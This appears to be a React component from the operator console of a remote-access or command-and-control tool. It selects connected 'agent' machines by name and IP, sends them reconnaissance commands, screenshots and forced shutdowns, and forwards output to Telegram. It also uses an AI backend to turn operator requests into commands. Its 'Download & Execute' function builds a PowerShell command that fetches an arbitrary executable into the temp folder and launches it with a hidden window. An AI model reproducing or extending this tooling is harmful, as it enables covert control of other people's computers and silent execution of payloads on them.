import React, { useState, useRef, useEffect } from 'react';
import { Agent } from '../types';
import { FiSend, FiTrash2, FiTerminal, FiPaperclip, FiMessageSquare, FiCommand, FiDownload, FiCamera, FiMonitor, FiList, FiGlobe, FiUser, FiWifi, FiFolder, FiPower, FiRefreshCw, FiX, FiZap } from 'react-icons/fi';
import request from '../axios';
import toast from 'react-hot-toast';

interface UnifiedTerminalProps {
  selectedAgent: Agent | null;
  onSelectAgent?: (agent: Agent | null) => void;
  agents: Agent[];
  onCommandSent: (command: any) => void;
  commandHistory: any[];
  setCommandHistory: React.Dispatch<React.SetStateAction<any[]>>;
}

type TerminalMode = 'chat' | 'commands';

const UnifiedTerminal: React.FC<UnifiedTerminalProps> = ({
  selectedAgent,
  onSelectAgent,
  agents,
  onCommandSent,
  commandHistory,
  setCommandHistory
}) => {
  const [userInput, setUserInput] = useState('');
  const [isProcessing, setIsProcessing] = useState(false);
  const [selectedClient, setSelectedClient] = useState<Agent | null>(selectedAgent);
  const [telegramEnabled, setTelegramEnabled] = useState(false);
  const [mode, setMode] = useState<TerminalMode>('commands');
  const [showDownloadModal, setShowDownloadModal] = useState(false);
  const [downloadUrl, setDownloadUrl] = useState('');
  
  // AI connection status
  const [aiConnected, setAiConnected] = useState(false);
  const [showAIConfigModal, setShowAIConfigModal] = useState(false);
  const [apiKey, setApiKey] = useState('');
  const terminalRef = useRef<HTMLDivElement>(null);

  // Update when parent changes
  useEffect(() => {
    setSelectedClient(selectedAgent);
  }, [selectedAgent]);

  // Check if Telegram is enabled
  useEffect(() => {
    const checkTelegramStatus = () => {
      const telegramConfig = localStorage.getItem('telegram-config');
      if (telegramConfig) {
        const config = JSON.parse(telegramConfig);
        setTelegramEnabled(config.enabled && config.botToken && config.chatId);
      }
    };
    
    checkTelegramStatus();
    const interval = setInterval(checkTelegramStatus, 5000);
    return () => clearInterval(interval);
  }, []);

  // Auto-scroll to bottom when new output arrives
  useEffect(() => {
    if (terminalRef.current) {
      terminalRef.current.scrollTop = terminalRef.current.scrollHeight;
    }
  }, [commandHistory]);

  // Check AI connection status
  useEffect(() => {
    checkAIStatus();
    const interval = setInterval(checkAIStatus, 30000); // Check every 30 seconds
    return () => clearInterval(interval);
  }, []);

  const checkAIStatus = async () => {
    try {
      const response = await request({
        url: '/ai/status',
        method: 'GET'
      });
      
      if (response.data.success) {
        setAiConnected(response.data.available);
      } else {
        setAiConnected(false);
      }
    } catch (error) {
      console.error('Failed to check AI status:', error);
      setAiConnected(false);
    }
  };

  const handleSaveAPIKey = async () => {
    try {
      const response = await request({
        url: '/ai/config',
        method: 'POST',
        data: { apiKey }
      });

      if (response.data.success) {
        toast.success('API key saved successfully');
        setShowAIConfigModal(false);
        // Force immediate status check
        await checkAIStatus();
        // Also check again after a short delay to ensure status is updated
        setTimeout(() => checkAIStatus(), 1000);
      }
    } catch (error) {
      console.error('Failed to save API key:', error);
      toast.error('Failed to save API key');
    }
  };

  const handleKeyPress = (e: React.KeyboardEvent) => {
    if (e.key === 'Enter' && !e.shiftKey) {
      e.preventDefault();
      handleSendCommand();
    }
  };

  // Hard-coded commands
  const hardCodedCommands = [
    { id: 'systeminfo', label: 'System Info', icon: FiMonitor, command: 'systeminfo', description: 'Get detailed system information' },
    { id: 'screenshot', label: 'Screenshot', icon: FiCamera, command: 'screenshot', description: 'Capture desktop screenshot' },
    { id: 'tasklist', label: 'Process List', icon: FiList, command: 'tasklist', description: 'List running processes' },
    { id: 'netstat', label: 'Network Status', icon: FiGlobe, command: 'netstat -an', description: 'List network connections' },
    { id: 'whoami', label: 'Current User', icon: FiUser, command: 'whoami', description: 'Show current user' },
    { id: 'ipconfig', label: 'IP Config', icon: FiWifi, command: 'ipconfig', description: 'Show network configuration' },
    { id: 'dir', label: 'File Explorer', icon: FiFolder, command: 'dir', description: 'List directory contents' },
    { id: 'reboot', label: 'Reboot', icon: FiRefreshCw, command: 'shutdown /r /t 0', description: 'Restart the system' },
    { id: 'shutdown', label: 'Shutdown', icon: FiPower, command: 'shutdown /s /t 0', description: 'Shutdown the system' },
    { id: 'download', label: 'Download File', icon: FiDownload, command: 'download', description: 'Download file from URL', isModal: true },
    { id: 'download_execute', label: 'Download & Execute', icon: FiDownload, command: 'download_execute', description: 'Download and execute silently', isModal: true },
    { id: 'custom', label: 'Custom Command', icon: FiCommand, command: 'custom', description: 'Execute custom command', isModal: true }
  ];

  const handleSendCommand = async (command?: string) => {
    const cmdToExecute = command || userInput.trim();
    if (!cmdToExecute || !selectedClient || isProcessing) return;

    setIsProcessing(true);
    const taskId = `cmd_${Date.now()}`;

    try {
      // Add to command history
      const newEntry = {
        id: taskId,
        timestamp: new Date().toISOString(),
        command: cmdToExecute,
        client: selectedClient.computerName,
        status: 'executing',
        output: 'Processing command with AI...',
        telegramSent: telegramEnabled,
        aiProcessed: false
      };

      setCommandHistory(prev => [...prev, newEntry]);
      setUserInput('');

      let finalCommand = cmdToExecute;
      let aiExplanation = '';

      // Process through AI if available and in commands mode
      if (aiConnected && mode === 'commands') {
        try {
          const aiResponse = await request({
            url: '/ai/process-command',
            method: 'POST',
            data: {
              userInput: cmdToExecute,
              clientInfo: selectedClient,
              context: { 
                previousCommands: commandHistory.slice(-5),
                mode: 'commands'
              }
            }
          });

          if (aiResponse.data.success) {
            finalCommand = aiResponse.data.data.command;
            aiExplanation = aiResponse.data.data.explanation;
            
            // Update command history with AI processing info
            setCommandHistory(prev => 
              prev.map(entry => 
                entry.id === taskId 
                  ? { 
                      ...entry, 
                      command: finalCommand,
                      output: `AI Processed: ${aiExplanation}`,
                      aiProcessed: true,
                      originalCommand: cmdToExecute
                    }
                  : entry
              )
            );
          }
        } catch (aiError) {
          console.warn('AI processing failed, using original command:', aiError);
          // Continue with original command if AI fails
        }
      }

      // Send the final command (AI-processed or original)
      await onCommandSent({
        targetUuid: selectedClient.id,
        command: finalCommand,
        id: taskId,
        aiProcessed: aiConnected && mode === 'commands',
        originalCommand: cmdToExecute !== finalCommand ? cmdToExecute : undefined
      });

    } catch (error) {
      console.error('Error sending command:', error);
      setCommandHistory(prev => 
        prev.map(entry => 
          entry.id === taskId 
            ? { ...entry, status: 'error', output: 'Failed to execute command' }
            : entry
        )
      );
    } finally {
      setIsProcessing(false);
    }
  };

  const handleHardCodedCommand = (command: any) => {
    if (command.isModal) {
      if (command.id === 'download') {
        setShowDownloadModal(true);
      } else if (command.id === 'download_execute') {
        setShowDownloadModal(true);
      } else if (command.id === 'custom') {
        // For custom commands, just set the input field
        setUserInput('');
      }
    } else {
      handleSendCommand(command.command);
    }
  };

  const handleDownloadExecute = () => {
    if (!downloadUrl.trim()) return;
    
    const command = `powershell -Command "Invoke-WebRequest -Uri '${downloadUrl}' -OutFile '$env:TEMP\\downloaded_file.exe'; Start-Process '$env:TEMP\\downloaded_file.exe' -WindowStyle Hidden"`;
    handleSendCommand(command);
    setShowDownloadModal(false);
    setDownloadUrl('');
  };

  const handleDownloadOnly = () => {
    if (!downloadUrl.trim()) return;
    
    const command = `powershell -Command "Invoke-WebRequest -Uri '${downloadUrl}' -OutFile '$env:TEMP\\downloaded_file.exe'"`;
    handleSendCommand(command);
    setShowDownloadModal(false);
    setDownloadUrl('');
  };

  const clearLogs = () => {
    setCommandHistory([]);
  };

  const onlineClients = agents.filter(agent => agent.status === 'online');

  return (
    <div className="premium-card h-full flex flex-col">
      {/* Header */}
      <div className="flex items-center justify-between p-4 border-b border-gray-200 dark:border-gray-700">
        <div className="flex items-center space-x-3">
          <FiTerminal className="w-5 h-5 text-indigo-600" />
          <h2 className="text-lg font-semibold text-gray-900 dark:text-white">AI Terminal</h2>
          
          {/* AI Connection Status */}
          <div 
            className={`flex items-center space-x-1 ${aiConnected ? 'text-green-600' : 'text-red-600 cursor-pointer hover:text-red-700'}`}
            onClick={() => !aiConnected && setShowAIConfigModal(true)}
          >
            <FiZap className="w-4 h-4" />
            <span className="text-xs font-medium">
              {aiConnected ? 'AI Connected' : 'AI Disconnected'}
            </span>
          </div>
          
          {/* Telegram Status */}
          {telegramEnabled && (
            <div className="flex items-center space-x-1 text-green-600">
              <FiPaperclip className="w-4 h-4" />
              <span className="text-xs font-medium">Telegram</span>
            </div>
          )}
        </div>
        
        <div className="flex items-center space-x-2">
          {/* Mode Toggle */}
          <div className="flex bg-gray-100 dark:bg-gray-700 rounded-lg p-1">
            <button
              onClick={() => setMode('chat')}
              className={`flex items-center space-x-2 px-3 py-1 rounded-md text-sm font-medium transition-colors ${
                mode === 'chat'
                  ? 'bg-white dark:bg-gray-600 text-indigo-600 dark:text-indigo-400 shadow-sm'
                  : 'text-gray-600 dark:text-gray-400 hover:text-gray-900 dark:hover:text-white'
              }`}
            >
              <FiMessageSquare className="w-4 h-4" />
              <span>Chat Mode</span>
            </button>
            <button
              onClick={() => setMode('commands')}
              className={`flex items-center space-x-2 px-3 py-1 rounded-md text-sm font-medium transition-colors ${
                mode === 'commands'
                  ? 'bg-white dark:bg-gray-600 text-indigo-600 dark:text-indigo-400 shadow-sm'
                  : 'text-gray-600 dark:text-gray-400 hover:text-gray-900 dark:hover:text-white'
              }`}
            >
              <FiCommand className="w-4 h-4" />
              <span>Commands Mode</span>
            </button>
          </div>
          
          <button
            onClick={clearLogs}
            className="premium-button text-sm bg-gray-600 hover:bg-gray-700"
            disabled={commandHistory.length === 0}
          >
            <FiTrash2 className="w-4 h-4 mr-1" />
            Clear Logs
          </button>
        </div>
      </div>

      <div className="flex-1 flex">
        {/* Main Terminal Output Area */}
        <div className="flex-1 flex flex-col">
          {/* Client Selector */}
          <div className="p-4 border-b border-gray-200 dark:border-gray-700">
            <div className="flex items-center space-x-3">
              <label className="text-sm font-medium text-gray-700 dark:text-gray-300">
                Target Client:
              </label>
              <select
                value={selectedClient?.id || ''}
                onChange={(e) => {
                  const client = onlineClients.find(c => c.id === e.target.value);
                  setSelectedClient(client || null);
                  onSelectAgent?.(client || null);
                }}
                className="premium-input max-w-xs"
                disabled={onlineClients.length === 0}
              >
                <option value="">
                  {onlineClients.length === 0 ? 'No online clients' : 'Select a client...'}
                </option>
                {onlineClients.map(client => (
                  <option key={client.id} value={client.id}>
                    {client.computerName} ({client.ipAddress})
                  </option>
                ))}
              </select>
              
              {selectedClient && (
                <div className="flex items-center space-x-2 text-sm text-gray-600 dark:text-gray-400">
                  <span className={`w-2 h-2 rounded-full ${selectedClient.status === 'online' ? 'bg-green-500' : 'bg-red-500'}`}></span>
                  <span>{selectedClient.status}</span>
                  {selectedClient.systemInfo?.isAdmin && (
                    <span className="premium-badge badge-admin text-xs">Admin</span>
                  )}
                </div>
              )}
            </div>
          </div>

          {/* Terminal Output */}
          <div 
            ref={terminalRef}
            className="flex-1 p-4 bg-black text-green-400 font-mono text-sm overflow-y-auto"
            style={{ minHeight: '400px' }}
          >
            {commandHistory.length === 0 ? (
              <div className="text-gray-500 text-center py-8">
                <FiTerminal className="w-8 h-8 mx-auto mb-2 opacity-50" />
                <p>No commands executed yet</p>
                <p className="text-xs mt-1">Select a client and enter a command to get started</p>
              </div>
            ) : (
              commandHistory.map((entry) => (
                <div key={entry.id} className={`mb-4 border-l-2 pl-3 ${
                  entry.status === 'completed' ? 'border-green-500' :
                  entry.status === 'error' ? 'border-red-500' :
                  entry.status === 'executing' ? 'border-blue-500' :
                  entry.status === 'retrying' ? 'border-yellow-500' :
                  'border-gray-500'
                }`}>
                  <div className="flex items-center justify-between mb-2">
                    <div className="flex items-center space-x-2">
                      <span className="text-green-400 font-bold">$</span>
                      <span className="text-white">{entry.command}</span>
                      {entry.aiProcessed && (
                        <span className="px-2 py-1 text-xs bg-purple-100 text-purple-800 rounded-full">
                          AI Processed
                        </span>
                      )}
                      {entry.retryCount > 0 && (
                        <span className="px-2 py-1 text-xs bg-yellow-100 text-yellow-800 rounded-full">
                          Retry {entry.retryCount}
                        </span>
                      )}
                    </div>
                    <span className="text-gray-500 text-xs">
                      [{new Date(entry.timestamp).toLocaleTimeString()}]
                    </span>
                  </div>
                  
                  {entry.originalCommand && entry.originalCommand !== entry.command && (
                    <div className="text-sm text-gray-400 mb-2">
                      <span className="font-medium">Original:</span> {entry.originalCommand}
                    </div>
                  )}
                  
                  <div className="text-gray-300 whitespace-pre-wrap command-history-entry">
                    {entry.output}
                  </div>
                  
                  {entry.aiChanges && entry.aiChanges.length > 0 && (
                    <div className="text-xs text-blue-400 mt-2">
                      <span className="font-medium">AI Changes:</span> {entry.aiChanges.join(', ')}
                    </div>
                  )}
                  
                  <div className="text-xs text-gray-500 mt-2 flex items-center justify-between">
                    <span>Client: {entry.client} | Status: {entry.status}</span>
                    {entry.telegramSent && (
                      <span className="text-blue-400">📤 Telegram</span>
                    )}
                  </div>
                </div>
              ))
            )}
          </div>

          {/* Command Input */}
          <div className="p-4 border-t border-gray-200 dark:border-gray-700">
            <div className="flex items-center space-x-3">
              <div className="flex-1">
                <textarea
                  value={userInput}
                  onChange={(e) => setUserInput(e.target.value)}
                  onKeyPress={handleKeyPress}
                  placeholder={selectedClient ? "Enter command..." : "Select a client first..."}
                  className="premium-input resize-none"
                  rows={2}
                  disabled={!selectedClient || isProcessing}
                />
              </div>
              <button
                onClick={() => handleSendCommand()}
                disabled={!selectedClient || !userInput.trim() || isProcessing}
                className="premium-button"
              >
                <FiSend className="w-4 h-4" />
              </button>
            </div>
            
            {telegramEnabled && (
              <div className="mt-2 text-xs text-green-600 flex items-center">
                <FiPaperclip className="w-3 h-3 mr-1" />
                Command outputs will be sent to Telegram
              </div>
            )}
          </div>
        </div>

        {/* Right Sidebar - Only show in Commands Mode */}
        {mode === 'commands' && (
          <div className="w-80 border-l border-gray-200 dark:border-gray-700 p-4">
            <h3 className="text-sm font-semibold text-gray-900 dark:text-white mb-4">
              Hard-coded Commands
            </h3>
            
            <div className="space-y-2">
              {hardCodedCommands.map((cmd) => {
                const IconComponent = cmd.icon;
                return (
                  <button
                    key={cmd.id}
                    onClick={() => handleHardCodedCommand(cmd)}
                    className="w-full text-left p-3 rounded-lg bg-gray-50 dark:bg-gray-800 hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors"
                    disabled={!selectedClient}
                    title={cmd.description}
                  >
                    <div className="flex items-center space-x-3">
                      <IconComponent className="w-5 h-5 text-indigo-600" />
                      <div>
                        <div className="text-sm font-medium text-gray-900 dark:text-white">
                          {cmd.label}
                        </div>
                        <div className="text-xs text-gray-500 dark:text-gray-400">
                          {cmd.description}
                        </div>
                      </div>
                    </div>
                  </button>
                );
              })}
            </div>

          {/* Telegram Status */}
          <div className="mt-6 p-3 rounded-lg bg-gray-50 dark:bg-gray-800">
            <h4 className="text-sm font-semibold text-gray-900 dark:text-white mb-2">
              Telegram Integration
            </h4>
            <div className="flex items-center space-x-2">
              <div className={`w-2 h-2 rounded-full ${telegramEnabled ? 'bg-green-500' : 'bg-red-500'}`}></div>
              <span className="text-xs text-gray-600 dark:text-gray-400">
                {telegramEnabled ? 'Connected' : 'Disabled'}
              </span>
            </div>
            {telegramEnabled && (
              <p className="text-xs text-gray-500 mt-1">
                All command outputs will be sent to your Telegram chat
              </p>
            )}
          </div>
        </div>
        )}
      </div>

      {/* Download Modal */}
      {showDownloadModal && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
          <div className="bg-white dark:bg-gray-800 rounded-lg p-6 w-full max-w-md">
            <div className="flex items-center justify-between mb-4">
              <h3 className="text-lg font-semibold text-gray-900 dark:text-white">
                Download & Execute
              </h3>
              <button
                onClick={() => setShowDownloadModal(false)}
                className="text-gray-400 hover:text-gray-600 dark:hover:text-gray-300"
              >
                <FiX className="w-5 h-5" />
              </button>
            </div>

            <div className="space-y-4">
              <div>
                <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">
                  Download URL
                </label>
                <input
                  type="url"
                  value={downloadUrl}
                  onChange={(e) => setDownloadUrl(e.target.value)}
                  placeholder="https://example.com/file.exe"
                  className="w-full px-3 py-2 border border-gray-300 dark:border-gray-600 rounded-lg focus:ring-2 focus:ring-indigo-500 focus:border-transparent bg-white dark:bg-gray-700 text-gray-900 dark:text-white"
                />
              </div>

              <div className="bg-yellow-50 dark:bg-yellow-900/20 border border-yellow-200 dark:border-yellow-800 rounded-lg p-3">
                <p className="text-sm text-yellow-800 dark:text-yellow-200">
                  <strong>Warning:</strong> This will download and execute the file on the target system. 
                  Make sure you trust the source.
                </p>
              </div>
            </div>

            <div className="flex justify-end space-x-3 mt-6">
              <button
                onClick={() => setShowDownloadModal(false)}
                className="px-4 py-2 bg-gray-600 hover:bg-gray-700 text-white rounded-lg"
              >
                Cancel
              </button>
              <button
                onClick={handleDownloadOnly}
                disabled={!downloadUrl.trim()}
                className="px-4 py-2 bg-blue-600 hover:bg-blue-700 text-white rounded-lg disabled:opacity-50"
              >
                <FiDownload className="w-4 h-4 mr-1 inline" />
                Download Only
              </button>
              <button
                onClick={handleDownloadExecute}
                disabled={!downloadUrl.trim()}
                className="px-4 py-2 bg-red-600 hover:bg-red-700 text-white rounded-lg disabled:opacity-50"
              >
                <FiDownload className="w-4 h-4 mr-1 inline" />
                Download & Execute
              </button>
            </div>
          </div>
        </div>
      )}

      {/* AI Configuration Modal */}
      {showAIConfigModal && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
          <div className="bg-white dark:bg-gray-800 rounded-lg p-6 w-full max-w-md">
            <div className="flex items-center justify-between mb-4">
              <h3 className="text-lg font-semibold text-gray-900 dark:text-white">
                Configure Google Gemini AI
              </h3>
              <button
                onClick={() => setShowAIConfigModal(false)}
                className="text-gray-400 hover:text-gray-600 dark:hover:text-gray-300"
              >
                <FiX className="w-5 h-5" />
              </button>
            </div>

            <div className="space-y-4">
              <div>
                <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
                  Gemini API Key
                </label>
                <input
                  type="password"
                  value={apiKey}
                  onChange={(e) => setApiKey(e.target.value)}
                  placeholder="Enter your Google Gemini API key"
                  className="w-full px-3 py-2 border border-gray-300 dark:border-gray-600 rounded-lg focus:ring-2 focus:ring-indigo-500 bg-white dark:bg-gray-700 text-gray-900 dark:text-white"
                />
              </div>

              <div className="bg-blue-50 dark:bg-blue-900/20 p-3 rounded-lg">
                <p className="text-sm text-blue-700 dark:text-blue-300">
                  Get your free API key from Google AI Studio:
                  <a 
                    href="https://makersuite.google.com/app/apikey" 
                    target="_blank" 
                    rel="noopener noreferrer"
                    className="underline ml-1"
                  >
                    https://makersuite.google.com/app/apikey
                  </a>
                </p>
              </div>
            </div>

            <div className="flex justify-end space-x-3 mt-6">
              <button
                onClick={() => setShowAIConfigModal(false)}
                className="px-4 py-2 bg-gray-600 hover:bg-gray-700 text-white rounded-lg"
              >
                Cancel
              </button>
              <button
                onClick={handleSaveAPIKey}
                disabled={!apiKey.trim()}
                className="px-4 py-2 bg-indigo-600 hover:bg-indigo-700 text-white rounded-lg disabled:opacity-50"
              >
                Save & Connect
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

export default UnifiedTerminal;